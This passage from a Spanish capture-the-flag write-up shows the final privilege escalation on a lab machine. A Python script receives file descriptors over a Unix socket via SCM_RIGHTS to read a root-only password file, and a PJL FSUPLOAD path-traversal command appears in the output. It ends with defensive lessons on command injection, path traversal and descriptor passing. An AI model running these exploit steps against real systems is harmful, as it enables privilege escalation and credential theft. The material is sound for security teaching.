    msg, fds = recv_fds(s, 1024, 10)
    print(f"[*] Message: {msg.decode(errors='ignore')}")
    print(f"[*] Received file descriptors: {fds}")

    if not fds:
        print("[-] No fds received.")
        s.close()
        return

    for fd in fds:
        try:
            data = os.pread(fd, 4096, 0)
            print(f"\n[+] Content of fd {fd}:")
            print(data.decode(errors='ignore'))
        except Exception as e:
            print(f"[-] fd {fd}: {e}")

    s.close()

if __name__ == "__main__":
    main()
```

La llamada crítica es `socket.recvmsg` — el compañero de bajo nivel de `recv` que expone datos de control ancillary junto con los bytes del payload. El parámetro `CMSG_LEN` reserva espacio de buffer para hasta `maxfds` fds; el `ancdata` devuelto se itera para encontrar cualquier entrada cuyo `cmsg_type == SCM_RIGHTS`, y el `cmsg_data` asociado es el array empaquetado de valores enteros de fd en la tabla de fd del receptor.

Una vez extraídos, `os.pread(fd, size, offset)` lee directamente del fd sin alterar su offset de fichero — la variante de "lectura posicional" que evita interferir con cualquier otro proceso que tenga la misma descripción subyacente.

### Extracción

```bash
archivist@paperwork:~$ python3 script.py
[*] Connected to daemon socket
[*] Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[*] Received file descriptors: [4, 5]

[+] Content of fd 4:
[127.0.0.1] connected
Command: @PJL FSUPLOAD NAME="0:/../../../../../../../run/paperwork/mgmt.sock" OFFSET=0 SIZE=6000


[+] Content of fd 5:
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Dos fds llegaron — el fd 4 es el fichero de log (la "evidencia"), y el fd 5 es `admin_pins.conf` — el fichero que archivist no puede abrir directamente, ahora legible a través del descriptor que root pasó. El contenido: **`ADMIN_PASSWORD=ApparelMortuaryCedar22`**.

### Root

```bash
archivist@paperwork:~$ su -
Password: ApparelMortuaryCedar22
Last login: Tue Aug  4 11:16:53 UTC 2026 on pts/1
root@paperwork:~# cat root.txt
```

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Lecciones Clave

- **Las aplicaciones que publican su propio código fuente están ofreciendo voluntariamente su superficie de ataque.** El Intake Portal enlazando a `paperwork-archive-v1.02` fue una decisión de diseño amigable con el operador — los administradores pueden inspeccionar el comportamiento exacto del daemon sin necesidad de acceso shell — pero también entregó al atacante una especificación grey-box completa del servicio. Si publicar la fuente es un requisito de negocio, la postura defensiva debe asumir que la fuente es pública y diseñar el servicio para ser seguro bajo disclosure de fuente. En la práctica esto significa tratar cada argumento a `subprocess.Popen`, cada string pasado a `eval`, y cada ruta tomada de input del usuario como adversarial independientemente de cuán "interno" el despliegue afirme ser.
- **La fuente intencionalmente malformada es un ejercicio de puzzle disfrazado de reto técnico.** El `server.py` de esta caja tenía una indentación sintácticamente inválida y una variable sin uso — el código no podía correr como estaba escrito. Leer fuente intencionalmente rota es una habilidad real de engagement: símbolos de debug con mismatch de versión, decompilación incompleta, exports parciales del historial de control de versiones. La técnica es identificar qué el código estaba *intentando* hacer (la variable `subcommand` claramente estaba pensada para ser testeada en algún sitio) y reconstruir la estructura faltante a partir del contexto (el RFC 1179 dice que el primer byte de cada transacción de control es un subcomando, coincidiendo con el dispatch externo `if command == 2:`). Una vez que la reconstrucción es coherente con el protocolo, el análisis puede proceder como si el código compilara.
- **`subprocess.Popen(f"... {var} ...", shell=True)` es command injection incondicionalmente.** Cada vez que el valor interpolado de una f-string llega a un shell, los metacaracteres del shell (`;`, `|`, `` ` ``, `$(...)`, `>`, `<`, `&`, newline, comillas simple/doble) quedan controlados por el atacante. El patrón correcto recurrente es `subprocess.Popen(["prog", var], shell=False)` — argumentos como lista, sin shell, sin sustitución. Si la operación genuinamente necesita features de shell, `shlex.quote(var)` normaliza el valor en una forma segura con comillas simples. Ninguno de los dos enfoques es complicado; ninguno es usado por quien escribe reflexivamente "solo un rápido append de log".
- **El protocolo LPD del RFC 1179 es una máquina de estados orientada a bytes que resiste a clientes off-the-shelf.** Un `lpr` estándar no dirigirá un servidor LPD custom cuyo chequeo de cola corre `queue in VALID_QUEUE` (substring, no igualdad) — pero la máquina de estados es lo suficientemente simple como para reimplementarla en ~40 líneas de Python. Cuando el objetivo habla un protocolo "bien conocido" en un puerto no estándar con una implementación custom, escribir un pequeño cliente construido a propósito suele ser más rápido que persuadir a una herramienta de propósito general para que se doblegue a los detalles.
- **`os.path.join(root, user_path)` no es una frontera de seguridad — es una concatenación sintáctica.** El error recurrente en código de sandboxing de rutas es tratar `os.path.join` como si restringiera el segundo argumento para estar dentro del primero. No lo hace. `os.path.join('/safe/root', '../etc/passwd')` devuelve `'/safe/root/../etc/passwd'`, que `os.path.normpath` posterior alegremente resuelve a `/etc/passwd`. El patrón correcto de sandbox es `abspath = os.path.abspath(os.path.join(root, user_path))` seguido de un chequeo explícito de prefijo: `if not abspath.startswith(root + os.sep): reject()`. El método `_translate` de jetdirect.py se saltó el chequeo; cada operación posterior quedó comprometida.
- **HP JetDirect / puerto 9100 / PJL es una clase específica de superficie de ataque con su propio tooling.** PRET (Printer Exploitation Toolkit) en `github.com/RUB-NDS/PRET` es la implementación de referencia canónica para explotación PJL/PostScript; automatiza FSDIRLIST, FSUPLOAD, FSDOWNLOAD, y docenas de comandos específicos del fabricante. Los emuladores como `jetdirect.py` que reimplementan el protocolo en Python para uso interno recrean la misma superficie de ataque con vulnerabilidades frescas — los implementadores copian la interfaz sin copiar el hardening más profundo que HP añadió al firmware real a lo largo de tres décadas de exposición.
- **La escritura de `authorized_keys` es un estado terminal universal para primitivas de escritura arbitraria de fichero.** Siempre que una ruta de explotación termina en "escribir en cualquier fichero que este usuario pueda escribir", plantar una clave pública en `~/.ssh/authorized_keys` convierte la primitiva en una ruta de autenticación persistente, fuera-de-banda, y con aspecto amigable para el admin. SSH mismo hace chequeo estricto de permisos sobre `.ssh/` y `authorized_keys` (`.ssh/` debe ser 700, `authorized_keys` debe ser 600 o 644 y propiedad del usuario), pero estas restricciones se satisfacen automáticamente cuando la escritura se realiza por un proceso corriendo como ese usuario.
- **`SCM_RIGHTS` es una feature documentada de Linux para pasar file descriptors, y su uso seguro requiere cuidado.** El mecanismo existe para que un proceso privilegiado pueda entregar un file descriptor específico a un proceso menos privilegiado para un propósito específico (un socket de listener de red a un worker, un fichero de log por request a un request-handler, un fichero temporal a un helper). Se convierte en una primitiva de escalada de privilegios siempre que el emisor pasa un descriptor que el receptor no se suponía que pudiera abrir. Defensa a nivel de diseño: nunca pases fds que transitivamente concedan acceso más amplio que la línea base del receptor; audita los call sites de `sendmsg` por qué fds específicos entregan y a qué frontera de confianza; prefiere enviar datos sobre el socket en lugar del fd que produjo los datos.
- **Los chequeos de permisos de Linux ocurren en `open()`, no en `read()`.** Una vez que un fichero está abierto, el kernel no re-evalúa el UID del que llama contra los bits de modo del fichero — el fd es autoritativo. Esto es lo que hace que `SCM_RIGHTS` funcione en absoluto, y es la misma propiedad que hace peligrosos a los binarios setuid de larga vida incluso después de que el fichero que abrieron haya tenido sus permisos apretados. Cualquier auditoría de "quién puede leer qué" debe incluir no solo el estado UID/modo actual sino también el conjunto de file descriptors abiertos mantenidos a través de los procesos del sistema y las rutas contra las que esos descriptors fueron abiertos.
- **Los ficheros de log como triggers controlables por el atacante son su propia clase sutil de vulnerabilidad.** El paperwork-daemon leía `commands.log` para decidir si disparar la ruta de lockdown — lo que significa que cualquier proceso que pudiera escribir a ese log podía inducir el comportamiento de lockdown (y su paso de fd asociado). El lockdown era en sí mismo la operación sensible, así que esto era privesc directa; incluso en casos menos severos, un log escribible por el atacante que un proceso privilegiado lee como input se convierte en un canal para que el atacante influya en decisiones privilegiadas. Cuando un daemon lee un log para tomar decisiones de seguridad, la ACL de escritura del log se convierte en parte del perímetro de seguridad.
